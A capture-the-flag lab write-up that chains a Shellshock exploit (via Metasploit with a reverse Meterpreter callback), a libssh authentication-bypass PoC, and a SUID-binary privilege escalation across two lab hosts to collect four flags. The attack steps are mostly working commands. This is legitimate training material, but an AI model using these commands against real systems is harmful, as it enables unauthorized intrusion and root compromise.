# Host & Network Penetration Testing: System-Host Based Attacks CTF 2


This lab demonstrates a chain of access using HTTP Shellshock on `target1.ine.local` and a libssh authentication bypass on `target2.ine.local`. The exercise covers discovery, exploitation with Metasploit and PoCs, limited post-exploitation enumeration, and privilege escalation via a SUID binary. Four flags were obtained during the lab; sensitive values have been redacted and replaced with placeholders.

---

## Flag 1 – Root directory file on target1 (Shellshock)  
**Hint:** *Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local.*

### Discovery
A quick service scan revealed an HTTP server running Apache:

```bash
nmap -sV -sC target1.ine.local
```

The webroot redirects to `/browser.cgi`. The site source contains a redirect to the CGI script:
```html
<meta http-equiv="refresh" content="0; url=./browser.cgi">
```

Running an NSE check for Shellshock showed the target is vulnerable:

```bash
nmap -sV target1.ine.local --script=http-shellshock --script-args "http-shellshock.uri=/browser.cgi"
```
`http-shellshock` reported the server as **VULNERABLE** (CVE-2014-6271).

### Exploitation
A Metasploit module for Apache mod_cgi Shellshock was used to stage a payload:

```msf
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS target1.ine.local
set TARGETURI /browser.cgi
set LHOST <your-IP>
set LPORT 4444
run
```

The module successfully delivered a payload and opened a Meterpreter session.

### Post-exploitation
From the Meterpreter session:
```msf
meterpreter > cd /
meterpreter > ls
# locate flag.txt in the filesystem root
meterpreter > cat flag.txt
```

---

## Flag 2 – Hidden file in web document root on target1  
**Hint:** *In the server's root directory, there might be something hidden. Explore `/opt/apache/htdocs/` carefully to find the next flag on target1.ine.local.*

### Enumeration
Using the Meterpreter session, the web document path was inspected:

```msf
meterpreter > cd /opt/apache/htdocs/
meterpreter > ls
meterpreter > cat .flag.txt
```

---

## Flag 3 – User home flag on target2 (libssh PoC)  
**Hint:** *Investigate the user's home directory and consider using `libssh_auth_bypass` to uncover the flag on target2.ine.local.*

### Discovery
`target2.ine.local` was scanned and showed an SSH server using libssh 0.8.3:

```bash
nmap -sV -sC target2.ine.local
# -> ssh libssh 0.8.3
```

`searchsploit` returned public proofs-of-concept for libssh authentication bypass:

```
linux/remote/45638.py
linux/remote/46307.py
```

### Exploitation (PoC)
A local PoC was used to execute commands without authentication:

```bash
python3 /usr/share/exploitdb/exploits/linux/remote/46307.py target2.ine.local 22 "cd home; cd user; ls"
python3 /usr/share/exploitdb/exploits/linux/remote/46307.py target2.ine.local 22 "cd home; cd user; cat flag.txt"
```

### Alternative via Metasploit
Metasploit includes an auxiliary module for the same bypass:

```msf
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS target2.ine.local
set SPAWN_PTY true
set ACTION Shell
run
# sessions -> interact with shell
```

This produced a shell for interactive enumeration when `SPAWN_PTY` was enabled.

---

## Flag 4 – Privilege escalation via SUID binary on target2  
**Hint:** *The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.*

### Enumeration and escalation
From the shell on `target2.ine.local` the user home contained a SUID binary `welcome`:

```sh
ls -al
-rwx------ 1 root root 8296 Jun 11  2024 greetings
-rwsr-xr-x 1 root root 8344 Jun 11  2024 welcome
```

Because `welcome` is a setuid root binary and the binary contains calls that can be abused:
- Replace or leverage an executable accessible to the running user (copying `/bin/bash` into a filename expected or invoked by the SUID binary), or
- Use the binary’s behavior to spawn a root shell.

In the lab, the following sequence was used (actions performed on the target under lab conditions):

```sh
# remove a user-owned helper, copy /bin/bash to a helper filename, then run the SUID binary
rm greetings
cp /bin/bash greetings
./welcome
cd /root
cat flag.txt
```

---

## Summary (plain text — no table)

1. **Flag 1 — HTTP Shellshock (Meterpreter):** Shellshock against `/browser.cgi` allowed command execution and retrieval of a file in `/` containing the first flag.  
2. **Flag 2 — Web document root file:** Using the Meterpreter session the hidden file `/opt/apache/htdocs/.flag.txt` was read and yielded the second flag.  
3. **Flag 3 — libssh auth bypass (PoC / Metasploit):** A libssh authentication bypass allowed execution as an unprivileged user and retrieval of `~/user/flag.txt`.  
4. **Flag 4 — SUID privilege escalation:** A setuid root binary in the user's home was abused to escalate to root and read `/root/flag.txt`.

---

## Tools used

- **nmap** – discovery and NSE scripts (`http-shellshock`)  
- **Metasploit Framework** – `exploit/multi/http/apache_mod_cgi_bash_env_exec`, `auxiliary/scanner/ssh/libssh_auth_bypass` and Meterpreter sessions  
- **searchsploit / exploit-db PoC** – libssh PoC (`46307.py`)  
- **python3** – run PoC scripts  
- **strings, file, ls, find** – local enumeration during post-exploitation

---

